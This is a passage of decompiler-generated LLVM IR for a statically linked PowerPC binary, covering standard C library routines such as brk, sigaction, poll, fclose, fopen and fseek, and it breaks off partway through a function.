  store i32 %v3_10013b18, i32* @global_var_1002c958.1157, align 4
  %v1_10013b28 = add i32 %arg1, 44
  %v2_10013b28 = inttoptr i32 %v1_10013b28 to i32*
  %v3_10013b28 = load i32, i32* %v2_10013b28, align 4
  store i32 %v3_10013b28, i32* @global_var_1002c95c.1158, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002c960.1121, align 4
  %v0_10013b5c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10013b5c)
  store i32 12, i32* @r3, align 4
  %v0_10013b64 = call i32 @__syscall_error()
  ret i32 %v0_10013b64

; uselistorder directives
  uselistorder i32* @global_var_1002c960.1121, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10013b80 = call i32 @__asm_mfcr()
  %v1_10013b84 = and i32 %v0_10013b80, 268435456
  %v3_10013b84 = icmp eq i32 %v1_10013b84, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10013b80, i32* %r31.global-to-local, align 4
  br i1 %v3_10013b84, label %dec_label_pc_10013b9c, label %dec_label_pc_10013b90

dec_label_pc_10013b90:                            ; preds = %entry
  %v0_10013b90 = call i32 @__errno_location()
  %v0_10013b94 = load i32, i32* %r31.global-to-local, align 4
  %v2_10013b94 = inttoptr i32 %v0_10013b90 to i32*
  store i32 %v0_10013b94, i32* %v2_10013b94, align 4
  br label %dec_label_pc_10013b9c

dec_label_pc_10013b9c:                            ; preds = %entry, %dec_label_pc_10013b90
  %v0_10013bac = phi i32 [ %v0_10013b80, %entry ], [ -1, %dec_label_pc_10013b90 ]
  ret i32 %v0_10013bac

; uselistorder directives
  uselistorder i1* @cr0_so, { 3, 0, 7, 8, 9, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_10013b9c, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10013bc8 = call i32 @__asm_mfcr()
  %v1_10013bcc = and i32 %v0_10013bc8, 268435456
  %v3_10013bcc = icmp eq i32 %v1_10013bcc, 0
  store i32 %v0_10013bc8, i32* %r31.global-to-local, align 4
  br i1 %v3_10013bcc, label %dec_label_pc_10013be4, label %dec_label_pc_10013bd8

dec_label_pc_10013bd8:                            ; preds = %entry
  %v0_10013bd8 = call i32 @__errno_location()
  %v0_10013bdc = load i32, i32* %r31.global-to-local, align 4
  %v2_10013bdc = inttoptr i32 %v0_10013bd8 to i32*
  store i32 %v0_10013bdc, i32* %v2_10013bdc, align 4
  br label %dec_label_pc_10013be4

dec_label_pc_10013be4:                            ; preds = %entry, %dec_label_pc_10013bd8
  %v0_10013bf4 = phi i32 [ %v0_10013bc8, %entry ], [ -1, %dec_label_pc_10013bd8 ]
  ret i32 %v0_10013bf4

; uselistorder directives
  uselistorder label %dec_label_pc_10013be4, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10013c0c = add i32 %tmp, 52
  %v3_10013c0c = inttoptr i32 %v2_10013c0c to i32*
  %v4_10013c0c = load i32, i32* %v3_10013c0c, align 4
  store i32 %v4_10013c0c, i32* @r28, align 4
  %v3_10013c10 = icmp eq i32 %v4_10013c0c, 0
  store i1 %v3_10013c10, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013c10, label %dec_label_pc_10013c18, label %dec_label_pc_10013c38

dec_label_pc_10013c18:                            ; preds = %entry
  %v2_10013c20 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10013c20, i32* @r3, align 4
  %v0_10013c2c = call i32 @__pthread_return_void()
  %v0_10013c34 = call i32 @__pthread_return_0()
  %v0_10013c38.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013c38

dec_label_pc_10013c38:                            ; preds = %entry, %dec_label_pc_10013c18
  %v0_10013c48 = phi i32 [ %tmp, %entry ], [ %v0_10013c38.pre, %dec_label_pc_10013c18 ]
  %v1_10013c38 = inttoptr i32 %v0_10013c48 to i16*
  %v2_10013c38 = load i16, i16* %v1_10013c38, align 2
  %v3_10013c38 = zext i16 %v2_10013c38 to i32
  store i32 0, i32* @r27, align 4
  %v1_10013c40 = and i32 %v3_10013c38, 64
  %v3_10013c40 = icmp eq i32 %v1_10013c40, 0
  br i1 %v3_10013c40, label %dec_label_pc_10013c54, label %dec_label_pc_10013c48

dec_label_pc_10013c48:                            ; preds = %dec_label_pc_10013c38
  store i32 268516432, i32* @lr, align 4
  %v4_10013c4c = call i32 @fflush_unlocked(i16* %v1_10013c38, i32 %v1_10013c40)
  store i32 %v4_10013c4c, i32* @r27, align 4
  %v0_10013c54.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013c54

dec_label_pc_10013c54:                            ; preds = %dec_label_pc_10013c38, %dec_label_pc_10013c48
  %v0_10013c54 = phi i32 [ %v0_10013c48, %dec_label_pc_10013c38 ], [ %v0_10013c54.pre, %dec_label_pc_10013c48 ]
  %v1_10013c54 = add i32 %v0_10013c54, 4
  %v2_10013c54 = inttoptr i32 %v1_10013c54 to i32*
  %v3_10013c54 = load i32, i32* %v2_10013c54, align 4
  store i32 268516444, i32* @lr, align 4
  %v1_10013c58 = call i32 @__libc_close(i32 %v3_10013c54)
  %v3_10013c5c = icmp eq i32 %v1_10013c58, 0
  store i1 %v3_10013c5c, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10013c58, -1
  br i1 %tmp8, label %dec_label_pc_10013c68, label %dec_label_pc_10013c64

dec_label_pc_10013c64:                            ; preds = %dec_label_pc_10013c54
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10013c68

dec_label_pc_10013c68:                            ; preds = %dec_label_pc_10013c54, %dec_label_pc_10013c64
  store i32 ptrtoint ([3 x i8]* @global_var_10011758.1042 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_1002c580.1040 to i32), i32* @r29, align 4
  %v1_10013c7c = load i32, i32* @r31, align 4
  %v2_10013c7c = add i32 %v1_10013c7c, 4
  %v3_10013c7c = inttoptr i32 %v2_10013c7c to i32*
  store i32 -1, i32* %v3_10013c7c, align 4
  %v2_10013c80 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10013c80, i32* @r30, align 4
  store i32 %v2_10013c80, i32* @r3, align 4
  %v0_10013c90 = call i32 @__pthread_return_void()
  %v0_10013c98 = call i32 @__pthread_return_0()
  %v3_10013ca0 = load i32, i32* @global_var_1002c918.1159, align 4
  store i32 %v2_10013c80, i32* @r3, align 4
  %v1_10013cac = add i32 %v3_10013ca0, 1
  store i32 %v1_10013cac, i32* @global_var_1002c918.1159, align 4
  %v0_10013cb4 = call i32 @__pthread_return_void()
  %v0_10013cb8 = load i32, i32* @r31, align 4
  %v1_10013cb8 = inttoptr i32 %v0_10013cb8 to i16*
  %v2_10013cb8 = load i16, i16* %v1_10013cb8, align 2
  %v3_10013cb8 = zext i16 %v2_10013cb8 to i32
  %v0_10013cbc = load i32, i32* @r28, align 4
  %v3_10013cbc = icmp eq i32 %v0_10013cbc, 0
  store i1 %v3_10013cbc, i1* %cr7_eq.global-to-local, align 1
  %v1_10013cc0 = call i32 @__asm_rlwinm(i32 %v3_10013cb8, i32 0, i32 17, i32 18)
  %v1_10013cc8 = or i32 %v1_10013cc0, 48
  %v1_10013ccc = trunc i32 %v1_10013cc8 to i16
  %v2_10013ccc = load i32, i32* @r31, align 4
  %v3_10013ccc = inttoptr i32 %v2_10013ccc to i16*
  store i16 %v1_10013ccc, i16* %v3_10013ccc, align 2
  %v0_10013cd0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10013cd0, label %dec_label_pc_10013cd4, label %dec_label_pc_10013ce0

dec_label_pc_10013cd4:                            ; preds = %dec_label_pc_10013c68
  %v2_10013cd4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10013cd4, i32* @r3, align 4
  %v0_10013cdc = call i32 @__pthread_return_void()
  br label %dec_label_pc_10013ce0

dec_label_pc_10013ce0:                            ; preds = %dec_label_pc_10013c68, %dec_label_pc_10013cd4
  %v0_10013ce0 = load i32, i32* @r31, align 4
  %v1_10013ce0 = inttoptr i32 %v0_10013ce0 to i16*
  %v2_10013ce0 = load i16, i16* %v1_10013ce0, align 2
  %v1_10013ce4 = and i16 %v2_10013ce0, 16384
  %v3_10013ce4 = icmp eq i16 %v1_10013ce4, 0
  br i1 %v3_10013ce4, label %dec_label_pc_10013cf4, label %dec_label_pc_10013cec

dec_label_pc_10013cec:                            ; preds = %dec_label_pc_10013ce0
  %v1_10013cec = add i32 %v0_10013ce0, 8
  %v2_10013cec = inttoptr i32 %v1_10013cec to i32*
  %v3_10013cec = load i32, i32* %v2_10013cec, align 4
  store i32 268516596, i32* @lr, align 4
  %v1_10013cf0 = call i32 @free(i32 %v3_10013cec)
  br label %dec_label_pc_10013cf4

dec_label_pc_10013cf4:                            ; preds = %dec_label_pc_10013ce0, %dec_label_pc_10013cec
  store i32 %v2_10013c80, i32* @r3, align 4
  %v0_10013d00 = call i32 @__pthread_return_void()
  %v0_10013d08 = call i32 @__pthread_return_0()
  %v3_10013d10 = load i16*, i16** @global_var_1002c91c.1160, align 4
  %v4_10013d10 = ptrtoint i16* %v3_10013d10 to i32
  store i32 %v2_10013c80, i32* @r3, align 4
  %v1_10013d1c = add i32 %v4_10013d10, 1
  %v4_10013d20 = inttoptr i32 %v1_10013d1c to i16*
  store i16* %v4_10013d20, i16** @global_var_1002c91c.1160, align 4
  %v0_10013d24 = call i32 @__pthread_return_void()
  store i32 268516652, i32* @lr, align 4
  %v0_10013d28 = call i32 @_stdio_openlist_dec_use()
  %v0_10013d30 = load i32, i32* @r27, align 4
  ret i32 %v0_10013d30

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 17, { 17, 2, 3, 18, 4, 13, 14, 5, 15, 6, 7, 8, 9, 10, 21, 22, 19, 20, 0, 1, 11, 12, 16 }
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 0, 33, 32, 31, 30, 29, 13, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 12, 11, 10, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_10013cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10013ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10013c68, { 1, 0 }
  uselistorder label %dec_label_pc_10013c54, { 1, 0 }
  uselistorder label %dec_label_pc_10013c38, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10013d4c = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10013d4c
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10013d50 = load i32, i32* @r5, align 4
  store i32 %v0_10013d50, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_10013d58 = zext i1 %tmp to i32
  %v2_10013d58 = ashr i32 %arg1, 31
  %v3_10013d58 = and i32 %v2_10013d58, -2
  %v4_10013d58 = or i32 %v3_10013d58, %v1_10013d58
  %v3_10013d5c = inttoptr i32 %v4_10013d58 to i16*
  %v4_10013d5c = call i32 @__GI_fseeko64(i16* %v3_10013d5c, i32 %arg1, i32 %v0_10013d50)
  ret i32 %v4_10013d5c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10013d60 = load i32, i32* @r7, align 4
  %v0_10013d64 = load i32, i32* @lr, align 4
  store i32 %v0_10013d64, i32* %r0.global-to-local, align 4
  store i32 %v0_10013d60, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10013d60, 3
  br i1 %tmp9, label %dec_label_pc_10013d9c, label %dec_label_pc_10013d88

dec_label_pc_10013d88:                            ; preds = %entry
  %v0_10013d88 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10013d94 = inttoptr i32 %v0_10013d88 to i32*
  store i32 22, i32* %v2_10013d94, align 4
  br label %dec_label_pc_10013e64

dec_label_pc_10013d9c:                            ; preds = %entry
  %v2_10013d9c = add i32 %tmp, 52
  %v3_10013d9c = inttoptr i32 %v2_10013d9c to i32*
  %v4_10013d9c = load i32, i32* %v3_10013d9c, align 4
  store i32 %v4_10013d9c, i32* @r28, align 4
  %v3_10013da0 = icmp eq i32 %v4_10013d9c, 0
  br i1 %v3_10013da0, label %dec_label_pc_10013da8, label %dec_label_pc_10013dc8

dec_label_pc_10013da8:                            ; preds = %dec_label_pc_10013d9c
  %v2_10013da8 = add i32 %tmp, 56
  store i32 %v2_10013da8, i32* @r29, align 4
  %v2_10013db0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10013db0, i32* @r3, align 4
  %v0_10013dbc = call i32 @__pthread_return_void()
  %v0_10013dc4 = call i32 @__pthread_return_0()
  %v0_10013dc8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013dc8

dec_label_pc_10013dc8:                            ; preds = %dec_label_pc_10013d9c, %dec_label_pc_10013da8
  %v0_10013dd4 = phi i32 [ %tmp, %dec_label_pc_10013d9c ], [ %v0_10013dc8.pre, %dec_label_pc_10013da8 ]
  %v1_10013dc8 = inttoptr i32 %v0_10013dd4 to i16*
  %v2_10013dc8 = load i16, i16* %v1_10013dc8, align 2
  %v3_10013dc8 = zext i16 %v2_10013dc8 to i32
  store i32 %v3_10013dc8, i32* %r0.global-to-local, align 4
  %v1_10013dcc = and i32 %v3_10013dc8, 64
  store i32 %v1_10013dcc, i32* %r9.global-to-local, align 4
  %v3_10013dcc = icmp eq i32 %v1_10013dcc, 0
  br i1 %v3_10013dcc, label %dec_label_pc_10013de4, label %dec_label_pc_10013dd4

dec_label_pc_10013dd4:                            ; preds = %dec_label_pc_10013dc8
  store i32 %v0_10013dd4, i32* @r3, align 4
  store i32 268516828, i32* @lr, align 4
  %v0_10013dd8 = call i32 @__stdio_wcommit()
  %v3_10013ddc = icmp eq i32 %v0_10013dd8, 0
  br i1 %v3_10013ddc, label %dec_label_pc_10013de4, label %dec_label_pc_10013e4c

dec_label_pc_10013de4:                            ; preds = %dec_label_pc_10013dd4, %dec_label_pc_10013dc8
  %v0_10013de4 = load i32, i32* @r30, align 4
  %v3_10013de4 = icmp eq i32 %v0_10013de4, 1
  br i1 %v3_10013de4, label %dec_label_pc_10013dec, label %dec_label_pc_10013de4.dec_label_pc_10013e00_crit_edge

dec_label_pc_10013de4.dec_label_pc_10013e00_crit_edge: ; preds = %dec_label_pc_10013de4
  br label %dec_label_pc_10013e00

dec_label_pc_10013dec:                            ; preds = %dec_label_pc_10013de4
  %v0_10013dec = load i32, i32* @r31, align 4
  %v1_10013dec = inttoptr i32 %v0_10013dec to i16*
  %v2_10013df0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268516856, i32* @lr, align 4
  %v4_10013df4 = call i32 @__stdio_adjust_position(i16* %v1_10013dec, i32 %v2_10013df0)
  %v1_10013df8 = icmp slt i32 %v4_10013df4, 0
  br i1 %v1_10013df8, label %dec_label_pc_10013e4c, label %dec_label_pc_10013dec.dec_label_pc_10013e00_crit_edge

dec_label_pc_10013dec.dec_label_pc_10013e00_crit_edge: ; preds = %dec_label_pc_10013dec
  %v0_10013e00.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10013e00

dec_label_pc_10013e00:                            ; preds = %dec_label_pc_10013de4.dec_label_pc_10013e00_crit_edge, %dec_label_pc_10013dec.dec_label_pc_10013e00_crit_edge
  %v0_10013e00 = phi i32 [ %v0_10013de4, %dec_label_pc_10013de4.dec_label_pc_10013e00_crit_edge ], [ %v0_10013e00.pre, %dec_label_pc_10013dec.dec_label_pc_10013e00_crit_edge ]
  %v0_10013e04 = load i32, i32* @r31, align 4
  store i32 268516880, i32* @lr, align 4
  %v5_10013e0c = call i32 @__stdio_seek(i32 %v0_10013e04, i32* nonnull %stack_var_-56, i32 %v0_10013e00)
  %v1_10013e10 = icmp slt i32 %v5_10013e0c, 0
  br i1 %v1_10013e10, label %dec_label_pc_10013e4c, label %dec_label_pc_10013e18

dec_label_pc_10013e18:                            ; preds = %dec_label_pc_10013e00
  %v0_10013e18 = load i32, i32* @r31, align 4
  %v1_10013e18 = inttoptr i32 %v0_10013e18 to i16*
  %v2_10013e18 = load i16, i16* %v1_10013e18, align 2
  %v3_10013e18 = zext i16 %v2_10013e18 to i32
  store i32 %v3_10013e18, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10013e20 = add i32 %v0_10013e18, 8
  %v2_10013e20 = inttoptr i32 %v1_10013e20 to i32*
  %v3_10013e20 = load i32, i32* %v2_10013e20, align 4
  store i32 %v3_10013e20, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_10013e28 = and i32 %v3_10013e18, 65464
  store i32 %v1_10013e28, i32* %r0.global-to-local, align 4
  %v3_10013e2c = add i32 %v0_10013e18, 2
  %v4_10013e2c = inttoptr i32 %v3_10013e2c to i8*
  store i8 0, i8* %v4_10013e2c, align 1
  %v0_10013e30 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e30 = load i32, i32* @r31, align 4
  %v2_10013e30 = add i32 %v1_10013e30, 28
  %v3_10013e30 = inttoptr i32 %v2_10013e30 to i32*
  store i32 %v0_10013e30, i32* %v3_10013e30, align 4
  %v0_10013e34 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e34 = trunc i32 %v0_10013e34 to i16
  %v2_10013e34 = load i32, i32* @r31, align 4
  %v3_10013e34 = inttoptr i32 %v2_10013e34 to i16*
  store i16 %v1_10013e34, i16* %v3_10013e34, align 2
  %v0_10013e38 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e38 = load i32, i32* @r31, align 4
  %v2_10013e38 = add i32 %v1_10013e38, 16
  %v3_10013e38 = inttoptr i32 %v2_10013e38 to i32*
  store i32 %v0_10013e38, i32* %v3_10013e38, align 4
  %v0_10013e3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e3c = load i32, i32* @r31, align 4
  %v2_10013e3c = add i32 %v1_10013e3c, 20
  %v3_10013e3c = inttoptr i32 %v2_10013e3c to i32*
  store i32 %v0_10013e3c, i32* %v3_10013e3c, align 4
  %v0_10013e40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e40 = load i32, i32* @r31, align 4
  %v2_10013e40 = add i32 %v1_10013e40, 24
  %v3_10013e40 = inttoptr i32 %v2_10013e40 to i32*
  store i32 %v0_10013e40, i32* %v3_10013e40, align 4
  %v0_10013e44 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013e44 = load i32, i32* @r31, align 4
  %v2_10013e44 = add i32 %v1_10013e44, 44
  %v3_10013e44 = inttoptr i32 %v2_10013e44 to i32*
  store i32 %v0_10013e44, i32* %v3_10013e44, align 4
  br label %dec_label_pc_10013e50

dec_label_pc_10013e4c:                            ; preds = %dec_label_pc_10013dd4, %dec_label_pc_10013e00, %dec_label_pc_10013dec
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_10013e50

dec_label_pc_10013e50:                            ; preds = %dec_label_pc_10013e18, %dec_label_pc_10013e4c
  %v0_10013e50 = load i32, i32* @r28, align 4
  %v3_10013e50 = icmp eq i32 %v0_10013e50, 0
  br i1 %v3_10013e50, label %dec_label_pc_10013e58, label %dec_label_pc_10013e64

dec_label_pc_10013e58:                            ; preds = %dec_label_pc_10013e50
  %v2_10013e58 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10013e58, i32* @r3, align 4
  %v0_10013e60 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10013e64

dec_label_pc_10013e64:                            ; preds = %dec_label_pc_10013e50, %dec_label_pc_10013d88, %dec_label_pc_10013e58
  store i32 %v0_10013d64, i32* %r0.global-to-local, align 4
  %v0_10013e68 = load i32, i32* @r30, align 4
  ret i32 %v0_10013e68

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10013e64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013e50, { 1, 0 }
  uselistorder label %dec_label_pc_10013e4c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10013e00, { 1, 0 }
  uselistorder label %dec_label_pc_10013dc8, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_10013e94 = load i16, i16* %arg1, align 2
  %v4_10013e94 = zext i16 %v3_10013e94 to i32
  %tmp9 = urem i16 %v3_10013e94, 4
  %v3_10013e98 = icmp eq i16 %tmp9, 0
  br i1 %v3_10013e98, label %dec_label_pc_10013ee4, label %dec_label_pc_10013ea0

dec_label_pc_10013ea0:                            ; preds = %entry
  %v1_10013e98 = zext i16 %tmp9 to i32
  %v1_10013ea0 = add nsw i32 %v1_10013e98, -1
  store i32 %v1_10013ea0, i32* %r10.global-to-local, align 4
  %v4_10013ea0 = icmp eq i32 %v1_10013ea0, 0
  br i1 %v4_10013ea0, label %dec_label_pc_10013ee4, label %dec_label_pc_10013ea8

dec_label_pc_10013ea8:                            ; preds = %dec_label_pc_10013ea0
  %v1_10013ea8 = and i32 %v4_10013e94, 2048
  %v3_10013ea8 = icmp eq i32 %v1_10013ea8, 0
  br i1 %v3_10013ea8, label %dec_label_pc_10013ee4, label %dec_label_pc_10013eb0

dec_label_pc_10013eb0:                            ; preds = %dec_label_pc_10013ea8
  %v2_10013eb0 = icmp sgt i32 %v1_10013ea0, 1
  br i1 %v2_10013eb0, label %dec_label_pc_10013f5c, label %dec_label_pc_10013eb8

dec_label_pc_10013eb8:                            ; preds = %dec_label_pc_10013eb0
  %v2_10013eb8 = add i32 %tmp, 40
  %v3_10013eb8 = inttoptr i32 %v2_10013eb8 to i32*
  %v4_10013eb8 = load i32, i32* %v3_10013eb8, align 4
  %v3_10013ebc = icmp eq i32 %v4_10013eb8, 0
  br i1 %v3_10013ebc, label %dec_label_pc_10013ec4, label %dec_label_pc_10013f5c

dec_label_pc_10013ec4:                            ; preds = %dec_label_pc_10013eb8
  %v2_10013ec4 = add i32 %tmp, 44
  %v3_10013ec4 = inttoptr i32 %v2_10013ec4 to i32*
  %v4_10013ec4 = load i32, i32* %v3_10013ec4, align 4
  %v2_10013ec8 = add i32 %tmp, 3
  %v3_10013ec8 = inttoptr i32 %v2_10013ec8 to i8*
  %v4_10013ec8 = load i8, i8* %v3_10013ec8, align 1
  %v5_10013ec8 = zext i8 %v4_10013ec8 to i32
  %v2_10013ed0 = sub nsw i32 %v1_10013ea0, %v5_10013ec8
  %v1_10013ed4 = add nsw i32 %v2_10013ed0, -1
  store i32 %v1_10013ed4, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_10013ec4, 1
  br i1 %tmp7, label %dec_label_pc_10013ee4, label %dec_label_pc_10013edc

dec_label_pc_10013edc:                            ; preds = %dec_label_pc_10013ec4
  %v2_10013edc = add i32 %tmp, 2
  %v3_10013edc = inttoptr i32 %v2_10013edc to i8*
  %v4_10013edc = load i8, i8* %v3_10013edc, align 1
  %v5_10013edc = zext i8 %v4_10013edc to i32
  %v2_10013ee0 = sub nsw i32 %v1_10013ed4, %v5_10013edc
  store i32 %v2_10013ee0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10013ee4

dec_label_pc_10013ee4:                            ; preds = %dec_label_pc_10013ec4, %dec_label_pc_10013ea8, %dec_label_pc_10013ea0, %entry, %dec_label_pc_10013edc
  %v0_10013f08 = phi i32 [ %v1_10013ed4, %dec_label_pc_10013ec4 ], [ %v1_10013ea0, %dec_label_pc_10013ea8 ], [ 0, %dec_label_pc_10013ea0 ], [ 0, %entry ], [ %v2_10013ee0, %dec_label_pc_10013edc ]
  %v1_10013ee4 = and i32 %v4_10013e94, 64
  %v3_10013ee4 = icmp eq i32 %v1_10013ee4, 0
  %storemerge.in.in.v = select i1 %v3_10013ee4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10013ef8 = add i32 %tmp, 16
  %v3_10013ef8 = inttoptr i32 %v2_10013ef8 to i32*
  %v4_10013ef8 = load i32, i32* %v3_10013ef8, align 4
  %v1_10013efc = inttoptr i32 %arg2 to i32*
  %v2_10013efc = load i32, i32* %v1_10013efc, align 4
  store i32 %v2_10013efc, i32* %r4.global-to-local, align 4
  %v2_10013f00 = sub i32 %storemerge, %v4_10013ef8
  %v1_10013f04 = add i32 %arg2, 4
  %v2_10013f04 = inttoptr i32 %v1_10013f04 to i32*
  %v3_10013f04 = load i32, i32* %v2_10013f04, align 4
  store i32 %v3_10013f04, i32* %r5.global-to-local, align 4
  %v2_10013f08 = add i32 %v2_10013f00, %v0_10013f08
  store i32 %v2_10013f08, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_10013f08, 0
  %v1_10013f10 = zext i1 %tmp10 to i32
  %v2_10013f10 = ashr i32 %v2_10013f08, 31
  %v3_10013f10 = and i32 %v2_10013f10, -2
  %v4_10013f10 = or i32 %v3_10013f10, %v1_10013f10
  %v2_10013f14 = sub i32 %v3_10013f04, %v2_10013f08
  %v3_10013f14 = sub i32 -1, %v2_10013f08
  store i32 %v2_10013f14, i32* %r10.global-to-local, align 4
  %v6_10013f14 = icmp ule i32 %v2_10013f14, %v3_10013f14
  %v2_10013f18 = sub nsw i32 -1, %v4_10013f10
  %v3_10013f18 = add i32 %v2_10013efc, %v2_10013f18
  %v5_10013f18 = zext i1 %v6_10013f14 to i32
  %v6_10013f18 = add i32 %v3_10013f18, %v5_10013f18
  store i32 %v6_10013f18, i32* %v1_10013efc, align 4
  %v0_10013f20 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013f20 = load i32, i32* %r8.global-to-local, align 4
  %v2_10013f20 = add i32 %v1_10013f20, 4
  %v3_10013f20 = inttoptr i32 %v2_10013f20 to i32*
  store i32 %v0_10013f20, i32* %v3_10013f20, align 4
  %v0_10013f24 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013f24 = inttoptr i32 %v0_10013f24 to i32*
  %v2_10013f24 = load i32, i32* %v1_10013f24, align 4
  %v1_10013f28 = load i32, i32* %r4.global-to-local, align 4
  %v3_10013f28 = icmp sgt i32 %v2_10013f24, %v1_10013f28
  br i1 %v3_10013f28, label %dec_label_pc_10013f40, label %dec_label_pc_10013f30

dec_label_pc_10013f30:                            ; preds = %dec_label_pc_10013ee4
  %v4_10013f28 = icmp eq i32 %v2_10013f24, %v1_10013f28
  br i1 %v4_10013f28, label %dec_label_pc_10013f34, label %dec_label_pc_10013f44thread-pre-split

dec_label_pc_10013f34:                            ; preds = %dec_label_pc_10013f30
  %v1_10013f34 = add i32 %v0_10013f24, 4
  %v2_10013f34 = inttoptr i32 %v1_10013f34 to i32*
  %v3_10013f34 = load i32, i32* %v2_10013f34, align 4
  %v1_10013f38 = load i32, i32* %r5.global-to-local, align 4
  %v3_10013f38 = icmp ugt i32 %v3_10013f34, %v1_10013f38
  br i1 %v3_10013f38, label %dec_label_pc_10013f40, label %dec_label_pc_10013f44thread-pre-split

dec_label_pc_10013f40:                            ; preds = %dec_label_pc_10013f34, %dec_label_pc_10013ee4
  %v0_10013f40 = load i32, i32* %r31.global-to-local, align 4
  %v1_10013f40 = sub i32 0, %v0_10013f40
  store i32 %v1_10013f40, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013f44

dec_label_pc_10013f44thread-pre-split:            ; preds = %dec_label_pc_10013f30, %dec_label_pc_10013f34
  %v0_10013f44.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013f44

dec_label_pc_10013f44:                            ; preds = %dec_label_pc_10013f44thread-pre-split, %dec_label_pc_10013f40
  %v0_10013f44 = phi i32 [ %v0_10013f44.pr, %dec_label_pc_10013f44thread-pre-split ], [ %v1_10013f40, %dec_label_pc_10013f40 ]
  %tmp8 = icmp sgt i32 %v0_10013f44, -1
  br i1 %tmp8, label %dec_label_pc_10013f60, label %dec_label_pc_10013f4c

